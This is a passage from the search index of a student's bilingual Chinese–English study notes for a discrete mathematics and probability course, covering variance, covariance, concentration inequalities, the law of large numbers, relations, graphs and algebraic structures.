<p>\u7b54\u6848\u7684\u60f3\u6cd5\u5f88\u5947\u7279\uff08\u4e2a\u4eba\u8ba4\u4e3a\uff09\uff0c\u8bb0 P[X_i = 0] \u4e3a i \u4ee3\u8868\u7684\u724c\u4e0d\u51fa\u73b0\u7684\u6982\u7387\uff0c\u90a3\u4e48 1-P[X_i = 0] \u5c31\u662f\u67d0\u5f20\u724c\u51fa\u73b0\u7684\u6982\u7387\uff0c\u6b64\u65f6 values += 1\uff0c\u90a3\u6211\u4eec\u770b\u4f5c\u4e24\u70b9\u5206\u5e03\u5373\u53ef\uff0c\u5373 E[X_i] = P [X_i != 0]</p> <p>(b) \u6ca1\u770b\u61c2 qwq </p> <p>Q 2 Swaps and cycles We\u2019ll say that a permutation \u03c0 = (\u03c0(1),...,\u03c0(n)) contains a swap if there exist i, j \u2208 {1,...,n} so that \u03c0(i) = j and \u03c0(j) = i, where i \u0338= j. - (a) What is the expected number of swaps in a random permutation?    In the same spirit as above, we\u2019ll say that \u03c0 contains a k-cycle if there exist i_1,...,i_k \u2208 {1,...,n} with \u03c0(i_1) = i_2,\u03c0(i_2) = i_3,...,\u03c0(i_k) = i_1. - (b) Compute the expectation of the numbe of k-cycles. We can find that swap is a 2-cycles, Let's take k numbers (1, 2, ... , k) for example, as they in cycle (with \\((k-1)!\\) kinds of permutations, the rest of the numbers (k+1, k+2, ... , n) have \\((n-k)!\\) kinds of permutations. Since k numbers are not special, we get \\(( ^{n}_{k})\\) kinds of k numbers. Ok, then we get that the expectation of k-cycles is: $$</p> <p>\\frac{(k-1)!(n-k)!}{n!}* (^{n}_{k} ) = \\frac{1}{k}</p> <p>$$</p>","tags":["DMPT","notes"]},{"location":"note/cs70/16-Variance/","title":"16 Variance","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/16-Variance/#i-random-variables-variance-and-covariance","title":"I Random Variables: Variance and Covariance","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/16-Variance/#i1-variance","title":"I.1 Variance\uff08\u65b9\u5dee\uff09","text":"<p>Quote</p> <p>In\u00a0probability theory\u00a0and\u00a0statistics, the\u00a0variance\u00a0is a way to measure how far a\u00a0set\u00a0of numbers is spread out. Variance describes how much a\u00a0random variable\u00a0differs from its\u00a0expected value. The variance is defined as the average of the\u00a0squares\u00a0of the differences between the individual (observed) and the expected value.</p> <p>[!DEFINITION 16.1]</p> <p>(Variance). For a r.v. X with expectation E[X] = \u00b5, the variance of X is defined to be \\(Var(X) = E[(X \u2212 \u00b5)^{2}]\\) . The square root \\(\u03c3(X) := \\sqrt{ Var(X) }\\) is called the standard deviation of X.</p> <p>[!THEOREM 15.3]</p> <p>For a r.v. X with expectation E[X] = \u00b5, we have \\(Var(X) = E[X^{2}]-\\mu^{2}\\) . and \\(Var[cX] = c^{2}Var[X]\\) .</p> <p>and we can even get that:</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/16-Variance/#i2-covariance","title":"I.2 Covariance","text":"<p>[!DEFINITION 16.2]</p> <p>(Covariance). The covariance of random variables X and Y , denoted Cov(X,Y), is defined as </p> \\[Cov(X,Y) = E[(X \u2212 \\mu_{X} )(Y \u2212 \\mu_{Y} )] = E[XY]\u2212\\mu_{X}\\mu_{Y}\\] <p>where \u00b5X = E[X] and \u00b5Y = E[Y].</p> <p>here are some important facts about covariance:</p> <p></p> <p>An example for  <code>the converse is not true</code> is given in Q 1 (a).</p> <p>[!DEFINITION 16.3]</p> <p>(Correlation). Suppose X and Y are random variables with \u03c3(X) &gt; 0 and \u03c3(Y) &gt; 0. Then, the correlation of X and Y is defined as </p> \\[Corr(X, Y) = \\frac{Cov(X, Y)}{\\sigma(X)\\sigma(Y)} \\in [-1, 1]\\] <p>\u770b\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u5df2\u7ecf\u53ef\u4ee5\u56de\u5fc6\u8d77\u9ad8\u4e2d\u5b66\u4e60\u7684\u7ebf\u6027\u89c4\u5212\u4e86\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/16-Variance/#ii-practice","title":"II Practice","text":"<p>Q 1 Double-Check Your Intuition Again</p> <p>(a) You roll a fair six-sided die and record the result X. You roll the die again and record the result Y. </p> <ul> <li> <p>(i) What is cov(X +Y,X \u2212Y)? </p> </li> <li> <p>(ii) Prove that X +Y and X \u2212Y are not independent. </p> </li> </ul> <p>Info</p> <p>\u534f\u65b9\u5dee\u7684\u53cc\u7ebf\u6027</p> <ul> <li> <p>cov(aX+bY,cZ)=ac\u22c5cov(X,Z)+bc\u22c5cov(Y,Z)</p> </li> <li> <p>cov(X+Y,cZ)=c\u22c5cov(X,Z)+c\u22c5cov(Y,Z)</p> </li> </ul> <p>\u5bf9\u4e8e(i)</p> \\[ \\begin{split} Cov(X+Y, X-Y)&amp;=Cov(X,X)+Cov(Y,X)-Cov(X,Y)-Cov(Y,Y) \\\\ &amp;= Cov(X,X)-Cov(Y,Y) \\\\&amp;=Var(X) - Var(Y)\\quad\\quad // X\u3001Y\u7684\u65b9\u5dee\u662f\u76f8\u540c\u7684 \\\\ &amp;= 0 \\end{split} \\] <p>\u5bf9\u4e8e (ii) \uff0cX+Y \u548c X-Y \u80af\u5b9a\u6709\u5173\u7cfb\uff0c\u6211\u4eec\u4e3e\u4e00\u4e2a\u53cd\u4f8b\u5373\u53ef\uff1a</p> <p>\u4f8b\u5982 \\(P[X+Y = 5, X-Y = 0] = 0\\quad != P[X+Y=5]* P[X-Y=0]\\)</p> <p>For each of the problems below, if you think the answer is \"yes\" then provide a proof. If you think the answer is \"no\", then provide a counterexample. </p> <p>(b) If X is a random variable and Var(X) = 0, then must X be a constant? </p> <p>yes, just need to know how to calculate Var(X).</p> <p>(c) If X is a random variable and c is a constant, then is Var(cX) = cVar(X)?</p> <p>no</p> <p>(d) If A and B are random variables with nonzero standard deviations and Corr(A,B) = 0, then are A and B independent? </p> <p>no, just see (a)</p> <p>(e) If X and Y are not necessarily independent random variables, but Corr(X,Y) = 0, and X and Y have nonzero standard deviations, then is Var(X +Y) = Var(X) +Var(Y)? The two subparts below are optional and will not be graded but are recommended for practice. </p> <p></p> <p>(f) If X and Y are random variables then is E[max(X,Y)min(X,Y)] = E[XY]? </p> <p>yes, it is obvious since max(X,Y)min(X,Y) = XY is always true.</p> <p>(g) If X and Y are independent random variables with nonzero standard deviations, then is Corr(max(X,Y),min(X,Y)) = Corr(X,Y)?</p> <p>It is difficult.</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/17-Concentration_Inequalities_and_the_Laws_of_Large_Numbers/","title":"17 Concentration Inequalities and the Laws of Large Numbers","text":"<p>Attention</p> <p>\u5728\u9605\u8bfb\u4e0b\u9762\u7684\u5185\u5bb9\u524d\uff0c\u60a8\u53ef\u80fd\u9700\u8981\u5148\u4fee\u8bfb   \u5fae\u79ef\u5206 - \u6781\u9650 \u90e8\u5206\u5185\u5bb9\u4ee5\u4fbf\u66f4\u597d\u7406\u89e3\u4e0b\u9762\u7684\u8bb2\u89e3  </p> <p>\u6211\u4eec\u6709\u65f6\u8bf4\u4e00\u4e2a\u4e1c\u897f\u7684\u6982\u7387\u4e3a p \uff0c\u4f46\u5728 empirical experience\uff08\u5b9e\u8df5\u5b9e\u9a8c\uff0c\u4e0e\u7406\u8bba\u63a8\u7406\u76f8\u5bf9\u5e94\uff09 \u4e2d\uff0c\u6211\u4eec\u8981\u8fdb\u884c\u591a\u5c11\u6b21\u624d\u6709\u8db3\u591f\u7684\u628a\u63e1\u8ba9\u5b9e\u9a8c\u6982\u7387 \\(\\hat{p}\\) \u4e0e p \u8db3\u591f\u63a5\u8fd1\u5462\uff1f\u4e0b\u9762\u7684\u8bba\u8ff0\u7ed9\u51fa\u7684\u7b54\u6848\uff1a</p> <p></p> <p>\u4e0d\u96be\u770b\u51fa\uff0c\u8fd9\u4e0e\u5fae\u79ef\u5206\u4e2d\u8bc1\u660e\u6781\u9650\u5b58\u5728\u65f6\u53d6 n \u8db3\u591f\u5927\u7684\u60c5\u51b5\u662f\u4e00\u6837\u7684\u3002</p> <p>\u5bf9\u4e8e\u4e0a\u8fb9\u6700\u540e\u7684\u7ed3\u8bba\uff0c\u6211\u4eec\u4e0b\u9762\u5c06\u4e00\u6b65\u4e00\u6b65\u8fdb\u884c\u8bc1\u660e\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/17-Concentration_Inequalities_and_the_Laws_of_Large_Numbers/#i-markovs-inequality","title":"I Markov\u2019s Inequality\uff08\u9a6c\u5c14\u53ef\u592b\u4e0d\u7b49\u5f0f\uff09","text":"<p>[!THEOREM 17.1]</p> <p>(Markov\u2019s Inequality). For a nonnegative random variable X (i.e., X(\u03c9) \u2265 0 for all \u03c9 \u2208 \u2126) with finite mean, \\(P[X \u2265 c] \u2264 \\frac{E[X]}{c}\\) , for any positive constant c.</p> <p>proof is shown below:</p> <p></p> <p>Info</p> <p>Indicator function</p> \\[I_{A} = \\begin{cases}1,\\quad if\\ x \\in A \\\\ 0,\\quad if\\ x \\not\\in A \\end{cases}\\quad or\\quad  I\\{\\epsilon\\} = \\begin{cases}1,\\quad if\\ \\epsilon\\ is\\ true \\\\ 0,\\quad if\\ \\epsilon\\ is\\ false \\end{cases}\\]","tags":["DMPT","notes"]},{"location":"note/cs70/17-Concentration_Inequalities_and_the_Laws_of_Large_Numbers/#ii-chebyshevs-inequality","title":"II Chebyshev\u2019s Inequality\uff08\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\uff09","text":"<p>[!THEOREM 17.2]</p> <p>(Chebyshev\u2019s Inequality) For a random variable X with finite expectation E[X] = \u00b5, \\(P[|X \u2212 \u00b5| \u2265 c] \u2264 \\frac{Var(X)}{c^{2}}\\) , for any positive constant c.</p> <p>The proof of Chebyshev's Inequality is easy since we just need to take</p> \\[|X \u2212 \\mu| \u2265 c \\implies |X-\\mu|^{2} \\geq c^{2}$$ using Markov\u2019s Inequality\uff0cso we get that \\] <p>P[|X-\\mu| \\geq c] = P[|X - \\mu|^{2} \\geq c^{2}] \\leq \\frac{E[(X-\\mu)^{2}]}{c^{2}} = \\frac{Var(X)}{c^{2}}</p> \\[ take $c = k\\sigma$ where $\\sigma = \\sqrt{ Var(X) }$ , we get that $$P[|X-\\mu| \\geq k\\sigma] \\leq \\frac{1}{k^{2}}\\] <p>which is of great importance.</p>","tags":["DMPT","notes"]},{"location":"note/cs70/17-Concentration_Inequalities_and_the_Laws_of_Large_Numbers/#iii-estimating-the-bias-of-a-coin","title":"III Estimating the Bias of a Coin","text":"<p>Now, let's solve the problem come up with at the begin.</p> <p></p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/17-Concentration_Inequalities_and_the_Laws_of_Large_Numbers/#iv-law-of-large-numbers","title":"IV Law of Large Numbers\uff08\u5927\u6570\u5b9a\u5f8b\uff09","text":"<p>[!THEOREM 17.3]</p> <p>(Law of Large Numbers) . Let X1,X2,..., be a sequence of i.i.d. (independent and identically distributed) random variables with common finite expectation E[Xi ] = \u00b5 for all i. Then, their partial sums Sn = X1 +X2 +\u00b7\u00b7\u00b7+Xn satisfy</p> <p>$$P\\left[ |\\frac{1}{n}S_{n}-\\mu|\\geq\\epsilon \\to 0  \\right]\\quad as\\quad n \\to \\infty $$</p> <p>for every \u03b5 &gt; 0, however small.</p> <p>That means if n is big enough, \\(\\frac{S_{n}}{n} \\to \\mu\\) .</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/","title":"18 Misc","text":"<p>\u771f\u5230\u4e86\u671f\u672b\u5468\uff0c\u611f\u89c9\u8fd8\u662f\u8981\u770b\u770b\u8bfe\u5185\u7684\u7b14\u8bb0\u3002</p> <p>\u8fd9\u91cc\u653e\u4e00\u4e9b\u4fe1\u5b89\u539f\u4e2d\u8bb2\u5230\u7684\u7684\u96f6\u788e\u77e5\u8bc6\u70b9\uff0c\u5305\u62ec\uff1a</p> <ul> <li> <p>\u6700\u5f00\u59cb\u5b66\u4e60\u65f6\u6ca1\u6709\u542c\u660e\u767d\u7684</p> </li> <li> <p>\u76f8\u6bd4\u4e8e xyx \u5b66\u957f\u7b14\u8bb0\u6709\u6240\u4e0d\u540c/\u589e\u6dfb\u7684 </p> </li> </ul> <p>\u5982\u679c\u540e\u7eed\u7cfb\u7edf\u5b66\u4e60\u4e86\u518d\u642c\u53bb\u5404\u4e2a\u7ae0\u8282\uff1b\u6807\u9898\u4ee3\u8868 PPT \u51fa\u5904\u3002</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_1","title":"\u79bb\u6563\u6570\u5b66","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#mathematical-logic","title":"Mathematical logic\uff08\u6570\u7406\u903b\u8f91\uff09","text":"<p>\u547d\u9898\u662f\u6570\u7406\u903b\u8f91\u4e2d\u6700\u57fa\u672c\u7684\u6982\u5ff5\u3002\u5bf9\u786e\u5b9a\u7684\u5bf9\u8c61\u505a\u51fa\u5224\u65ad\u7684\u9648\u8ff0\u53e5\u79f0\u4e3a\u547d\u9898\uff08proposition\uff09\u3002</p> <ul> <li> <p>\u8bc6\u522b\u8981\u70b9\uff1a\u9648\u8ff0\u53e5\uff0c\u5224\u65ad\uff0c\u786e\u5b9a\u7684\u5bf9\u8c61\u3002</p> </li> <li> <p>\u6096\u8bba\uff08\u81ea\u76f8\u77db\u76fe\uff09\u4e0d\u80fd\u4f5c\u4e3a\u547d\u9898 \u3002</p> </li> </ul> <p>\u5982\u679c\u8fd9\u4e2a\u5224\u65ad\u662f\u6b63\u786e\u7684\uff0c\u79f0\u547d\u9898\u4e3a\u771f\uff08true\uff09\uff0c\u5426\u5219\u79f0\u547d\u9898\u4e3a\u5047\uff08false\uff09\u3002</p> <p>\u771f\u3001\u5047\u662f\u547d\u9898\u7684\u5c5e\u6027\uff0c\u79f0\u4e3a\u771f\u503c\u3002</p> <p></p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#ways-to-proof","title":"ways to proof","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#priority-of-operations","title":"priority of operations","text":"<p>1.\u00a0\u62ec\u53f7\u00a0()\uff1a\u65e0\u8bba\u5728\u54ea\u4e2a\u9886\u57df\uff0c\u62ec\u53f7\u59cb\u7ec8\u5177\u6709\u6700\u9ad8\u7684\u4f18\u5148\u7ea7\uff0c\u7528\u4e8e\u6539\u53d8\u9ed8\u8ba4\u7684\u4f18\u5148\u7ea7\u987a\u5e8f\u3002</p> <p>2.\u00a0\u975e\u00a0~\u00a0\u00a0!\uff1a\u5728\u903b\u8f91\u8fd0\u7b97\u4e2d\uff0c\u5426\u5b9a\uff08\u903b\u8f91\u975e\u3001\u4f4d\u975e\uff09\u901a\u5e38\u5177\u6709\u8f83\u9ad8\u7684\u4f18\u5148\u7ea7\u3002</p> <p>3.\u00a0\u4e0e\u00a0\u2227\uff1a\u8fd9\u5305\u62ec\u903b\u8f91\u4e0e\uff08AND\uff09\u3001\u4f4d\u4e0e\uff08&amp;\uff09\u3002\u5728\u6ca1\u6709\u62ec\u53f7\u6539\u53d8\u987a\u5e8f\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u901a\u5e38\u5728\u5426\u5b9a\u4e4b\u540e\u7acb\u5373\u8bc4\u4f30\u3002</p> <p>4.\u00a0\u5f02\u6216\u00a0\u2295\uff1a\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u8003\u8651\u5f02\u6216\u8fd0\u7b97\uff08XOR\uff09\uff0c\u5b83\u53ef\u80fd\u5728\u4e0e\u8fd0\u7b97\u548c\u6216\u8fd0\u7b97\u4e4b\u95f4\u3002</p> <p>5.\u00a0\u6216\u00a0\u2228\uff1a\u8fd9\u5305\u62ec\u903b\u8f91\u6216\uff08OR\uff09\u3001\u4f4d\u6216\uff08|\uff09\u3002\u5b83\u4eec\u5728\u903b\u8f91\u4e0e\u4e4b\u540e\u8fdb\u884c\u8bc4\u4f30\u3002</p> <p>6.\u00a0\u6761\u4ef6\u00a0\u2192\uff1a\u5982\u8574\u542b\uff08\u2192\uff09\u901a\u5e38\u4f18\u5148\u7ea7\u8f83\u4f4e\u3002</p> <p>7.\u00a0\u53cc\u6761\u4ef6\u2194\uff1a\u53cc\u6761\u4ef6\uff08\u2194\uff09\u901a\u5e38\u5177\u6709\u6700\u4f4e\u7684\u4f18\u5148\u7ea7</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#ppt","title":"\u96c6\u5408\u8bba\uff08\u7b2c\u5341\u8bfe PPT\uff09","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_2","title":"\u96c6\u5408\u7684\u57fa\u672c\u8fd0\u7b97","text":"<p>Question</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_3","title":"\u5173\u7cfb","text":"<p>\u5bf9\u4e8e\u5173\u7cfb\u7684\u5224\u5b9a\u4ece\u56fe\u8bba\u7684\u89d2\u5ea6\u6765\u770b\u53ef\u80fd\u4f1a\u66f4\u52a0\u597d\u7406\u89e3</p> <p>\u5982\u4f55\u7406\u89e3\u4e0b\u9762\u7ea2\u6846\u4e2d\u7684\u4e24\u4e2a\u63a8\u8bba\uff1a</p> <p></p> <p>\u9996\u5148\u7406\u89e3\u4e0b\u9762\u4e24\u7ec4\u5b9a\u4e49\uff1a</p> <p></p> <ul> <li>\u7531\u903b\u8f91\u8574\u6db5 \\(P\\to Q\\) \u5f53\u4e14\u4ec5\u5f53 \\(P=1  \\land Q= 0\\) \u65f6\u4e3a\u5047 =&gt; A \u4e3a\u7a7a\u65f6\uff0c\\(x \\in A\\) \u6052\u4e3a\u5047\uff0c\u5373 \\(P=0\\) \uff0c\u6545\uff08\u53cd\uff09\u5bf9\u79f0\u5173\u7cfb\u4e2d\u63a8\u5bfc\u5f0f\u6052\u4e3a\u771f\uff0c\u6545\u81ea\u53cd\u4e14\u53cd\u81ea\u53cd</li> </ul> <p></p> <ul> <li>\u5bf9\u4e8e \\(E_{A}\\) \uff0c\u53ea\u6709\u6307\u5411\u81ea\u5df1\u7684\u8fb9\uff0c\u4efb\u610f\u4e24\u4e2a\u8282\u70b9\u4e4b\u95f4\u90fd\u6ca1\u6709\u8fb9\uff01\u90a3\u5f53\u7136\u662f\u5bf9\u79f0\u548c\u53cd\u5bf9\u79f0\u90fd\u6ee1\u8db3\u4e86</li> </ul> <p></p> <p></p> <p></p> <p></p> <p>\u7ed3\u5408\u4f20\u9012\u5173\u7cfb\u7684\u5b9a\u4e49\uff1a</p> <p></p> <ul> <li> <p>\\(x,y,z \\in A\\) \u672c\u8eab\u4e3a\u5047\uff0c\u6545\u8be5\u5f0f\u6052\u771f\uff0c\u6545\u4f20\u9012</p> </li> <li> <p>\u5728 R \u4e2d \\(1\\to2 ,1\\to 3\\) \uff0c\u786e\u5b9e\u627e\u4e0d\u5230\u4e0d\u7b26\u5408\u4f20\u9012\u7684\u4e24\u4e2a\u8282\u70b9\uff0c\u6545\u4f20\u9012</p> </li> <li> <p>\u8fd9\u4e9b\u5145\u8981\u6761\u4ef6\u53ef\u4ee5\u8bb0\u5fc6</p> </li> </ul>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_4","title":"\u7b49\u4ef7\u5173\u7cfb","text":"<p>\u5982\u679c A \u4e0a\u7684\u4e00\u4e2a\u4e8c\u5143\u5173\u7cfb\u5177\u6709\u81ea\u53cd\u3001\u5bf9\u79f0\u3001\u4f20\u9012\u6027\uff0c\u5219\u79f0\u5b83\u662f\u4e00\u4e2a \u7b49\u4ef7\u5173\u7cfb\uff08equivalent relation\uff09</p> <p>\u4f8b\u5982\uff1a</p> <ul> <li>\u4e09\u89d2\u5f62\u7684\u76f8\u4f3c\u3001\u5168\u7b49</li> <li>\u4eb2\u621a\u5173\u7cfb</li> <li>\\(x\\equiv y \\operatorname{mod} k\\)</li> </ul>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_5","title":"\u5e8f\u5173\u7cfb","text":"<p>\u5982\u679c A \u4e0a\u7684\u4e00\u4e2a\u4e8c\u5143\u5173\u7cfb\u5177\u6709\u53cd\u81ea\u53cd\u3001\u53cd\u5bf9\u79f0\u3001\u4f20\u9012\u6027\uff0c\u5219\u79f0\u5176\u4e3a\u4e00\u4e2a \u5e8f\u5173\u7cfb\u00a0(ordered relation)\u3002</p> <p>\u4f8b\u5982\uff1a</p> <ul> <li>\u81ea\u7136\u6570\u96c6 \\(\\mathbb{N}\\) \u4e0a\u7684\u201c\u5c0f\u4e8e\u6216\u7b49\u4e8e\u201d\u5173\u7cfb\u662f\u5e8f\u5173\u7cfb\uff0c\u6709\u5e8f\u96c6\u8bb0\u4f5c &lt; \\(\\mathbb{N}\\), \u2264&gt;\u3002</li> <li>\u96c6\u5408 A \u7684\u5e42\u96c6 \u03c1(A) \u4e0a\u7684\u201c\u5305\u542b\u201d\u5173\u7cfb\u662f\u5e8f\u5173\u7cfb\uff0c\u6709\u5e8f\u96c6\u8bb0\u4f5c &lt;\u03c1(A), \\(\\subseteq\\) &gt;\u3002</li> <li>\u6b63\u6574\u6570\u96c6\u5408 \\(\\mathbb{Z^+}\\) \u4e0a\u7684\u201c\u6574\u9664\u201d\u5173\u7cfb\u662f\u5e8f\u5173\u7cfb\uff0c\u6709\u5e8f\u96c6\u8bb0\u4f5c &lt; \\(\\mathbb{Z^+}\\), |&gt;\u3002</li> </ul>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_6","title":"\u54c8\u65af\u56fe\u2014\u2014\u5143","text":"<p>\u6700\u5c0f\uff08\u5927\uff09\u5143\u4e0e\u6781\u5c0f\uff08\u5927\uff09\u5143\u7684\u533a\u522b\u662f\uff1a</p> <ul> <li> <p>\u6700 \u8981\u6c42\u6240\u6709\u5143\u7d20\u5747\u53ef\u4ee5\u6bd4\u8f83\u5373\u5747\u53ef\u8868\u8ff0\u4e3a \u5c0f\u4e8e\u6216\u7b49\u4e8e </p> </li> <li> <p>\u6781 \u5219\u53ea\u9700\u8981\u90a3\u4e9b\u53ef\u4ee5\u6bd4\u8f83\u7684\u90fd\u7b26\u5408 \u5c0f\u4e8e\u6216\u7b49\u4e8e \u5373\u53ef</p> </li> </ul> <p>\u5982\u679c\u4e00\u4e2a\u96c6\u5408\u4e2d\u6240\u6709\u5143\u7d20\u4e24\u4e24\u4e0d\u53ef\u6bd4\u8f83\uff0c\u90a3\u6211\u4eec\u53ef\u4ee5\u8bf4\u6240\u6709\u5143\u7d20\u90fd\u662f\u6781\u5c0f\uff08\u5927\uff09\u5143</p> <p>Note</p> <ul> <li> <p>B \u7684\u6700\u5927\uff08\u5c0f\uff09\u5143\u5fc5\u4e3a B \u7684\u6781\u5927\uff08\u5c0f\uff09\u5143</p> </li> <li> <p>B \u4e0d\u4e00\u5b9a\u5b58\u5728\u6700\u5927\uff08\u5c0f\uff09\u5143\uff0c\u4f46\u5b58\u5728\u5219\u662f\u552f\u4e00\u7684</p> </li> <li> <p>\u5982\u679c B \u662f\u6709\u9650\u96c6\uff0c\u5219 B \u5fc5\u5b58\u5728\u6781\u5927\uff08\u5c0f\uff09\u5143\uff0c\u4f46\u672a\u5fc5\u552f\u4e00</p> </li> </ul>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_7","title":"\u8fd0\u7b97","text":"<p>Note</p> <p>\u6211\u4eec\u901a\u8fc7\u6709\u5411\u56fe\u4e0d\u4ec5\u53ef\u4ee5\u63cf\u8ff0\u5173\u7cfb\uff0c\u8fd8\u53ef\u4ee5\u63cf\u8ff0\u8fd0\u7b97 A&amp;B\uff08&amp;\u8868\u793a\u67d0\u4e00\u8fd0\u7b97\u7b26\uff1bA\u3001B \u5177\u6709\u76f8\u540c\u7684\u9876\u70b9\uff0cU \u8868\u793a\u5bf9\u5e94\u5b8c\u5168\u56fe\uff1b\u6bd5\u7adf\u56fe\u672c\u8eab\u5c31\u53ef\u4ee5\u7528\u96c6\u5408\u6765\u63cf\u8ff0\uff09\uff1a</p> <ul> <li> <p>\u5e76\u8fd0\u7b97\uff1aA \u6dfb\u52a0 A \u4e2d\u6ca1\u6709\u4f46\u662f B \u4e2d\u6709\u7684\u8fb9</p> </li> <li> <p>\u5dee\u8fd0\u7b97\uff1aA \u5220\u51cf AB \u4e2d\u90fd\u542b\u6709\u7684\u8fb9</p> </li> <li> <p>\u4ea4\u8fd0\u7b97\uff1a\u4fdd\u7559 AB \u4e2d\u90fd\u542b\u6709\u7684\u8fb9</p> </li> <li> <p>\u8865\u8fd0\u7b97\uff1a\u76f8\u5f53\u4e8e U - A</p> </li> <li> <p>\u9006\u8fd0\u7b97\uff1a\u76f8\u5f53\u4e8e\u628a\u6709\u5411\u56fe\u7684\u8fb9\u5168\u90e8\u53cd\u8fc7\u6765</p> </li> </ul> <p> </p> <ul> <li> <p>\u5728\u4e00\u4e2a\u6bcf\u4e00\u4e2a\u8282\u70b9\u90fd\u6709\u73af\u7684\u56fe\u4e2d\u6dfb\u52a0\u82e5\u5e72\u6761\u8fb9\uff0c\u6bcf\u4e2a\u8282\u70b9\u4f9d\u65e7\u6709\u73af</p> </li> <li> <p>\u5728\u4e00\u4e2a\u6bcf\u4e00\u4e2a\u8282\u70b9\u90fd\u6ca1\u6709\u73af\u7684\u56fe\u4e2d\u5220\u53bb\u82e5\u5e72\u6761\u8fb9\uff0c\u4f9d\u65e7\u6ca1\u6709\u73af</p> </li> <li> <p>\u53ea\u8981\u77e5\u9053 \\(\\neg y \\overline{R}x \\equiv yRx\\) \u5c31\u6ca1\u5565\u95ee\u9898\u4e86</p> </li> <li> <p>\u4e24\u4e2a\u56fe\u4e2d\u8282\u70b9\u90fd\u81f3\u591a\u53ea\u6307\u5411\u81ea\u5df1\uff0c\u53d6\u5b83\u4eec\u7684\u76f8\u540c\u8fb9\uff0c\u81ea\u7136\u4e5f\u53ea\u6709\u6307\u5411\u8282\u70b9\u81ea\u5df1\u7684\u8fb9</p> </li> <li> <p>\u4e0d\u96be\u5f97\u8bc1</p> </li> </ul> <p></p> <p>\u4e00\u5c42\u5212\u5206\u4e3a\u4e00\u4e2a\u5355\u5143\uff0c\u4e0d\u96be\u9a8c\u8bc1</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#ppt_1","title":"\u56fe\u8bba\uff08\u7b2c\u5341\u4e8c\u8bfe PPT\uff09","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_8","title":"\u6b27\u62c9\u56fe&amp;\u6b27\u62c9\u8def\u5f84","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_9","title":"\u54c8\u5bc6\u987f\u901a\u8def","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_10","title":"\u90bb\u63a5\u77e9\u9635","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_11","title":"\u8def\u5f84\u77e9\u9635","text":"<p>\u6211\u4eec\u7528\u6790\u53d6 \\(\\land\\) \u8868\u793a\u77e9\u9635\u76f8\u4e58\uff0c\u5408\u53d6 \\(\\lor\\) \u8868\u793a\u77e9\u9635\u76f8\u52a0</p> <p></p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_12","title":"\u4e8c\u5206\u56fe","text":"<p>\u4e8c\u5206\u56fe\u53ef\u4ee5\u5c06\u6240\u6709\u9876\u70b9\u5206\u4e3a\u4e24\u4e2a\u96c6\u5408\uff0c\u96c6\u5408\u5185\u90e8\u7684\u9876\u70b9\u4e4b\u95f4\u4e0d\u5b58\u5728\u8fb9</p> <p></p> <p></p> <p></p> <p>oi-wiki \u4e2d\u6709\u66f4\u52a0\u5177\u4f53\u7684\u8bb2\u89e3\uff0c\u5355\u770b PPT \u4e0a\u7684\u8bb2\u89e3\u5e94\u8be5\u662f\u96be\u4ee5\u7406\u89e3\u7684</p>","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_13","title":"\u5e73\u9762\u56fe","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_14","title":"\u5b50\u56fe&amp;\u751f\u6210\u5b50\u56fe","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_15","title":"\u6811","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#ppt_2","title":"\u4ee3\u6570\u7cfb\u7edf\uff08\u7b2c\u5341\u4e09\u8bfe PPT\uff09","text":"","tags":["DMPT","notes"]},{"location":"note/cs70/18-Misc/#_16","title":"\u4ee3\u6570\u7ed3\u6784\u7684\u7c7b\u578b","text":"<ul> <li>\u8fd0\u7b97\u6ee1\u8db3\u7ed3\u5408\u5f8b\u7684\u4ee3\u6570\u7ed3\u6784\u79f0\u4e3a \u534a\u7fa4\uff08semigroup\uff09</li> <li>\u542b\u6709\u5e7a\u5143\u7684\u534a\u7fa4\u79f0\u4e3a \u72ec\u5f02\u70b9\uff08monoid\uff09</li> <li>\u6bcf\u4e2a\u5143\u7d20\u90fd\u6709\u9006\u5143\uff08\u5373\uff0c\u4e00\u5b9a\u6ca1\u6709\u96f6\u5143\uff09\u7684\u72ec\u5f02\u70b9\u79f0\u4e3a \u7fa4\uff08group\uff09</li> <li> <p>\u6ee1\u8db3\u4ea4\u6362\u5f8b\u7684\u7fa4\u79f0\u4e3a \u4ea4\u6362\u7fa4 \u6216 \u963f\u8d1d\u5c14\u7fa4\uff08Abel group\uff09</p> </li> <li> <p>\u4ee3\u6570\u7ed3\u6784  \u662f\u4e00\u4e2a \u73af\uff08ring\uff09\uff0c\u5982\u679c\u5b83\u6ee1\u8db3\uff1a <li> <p> 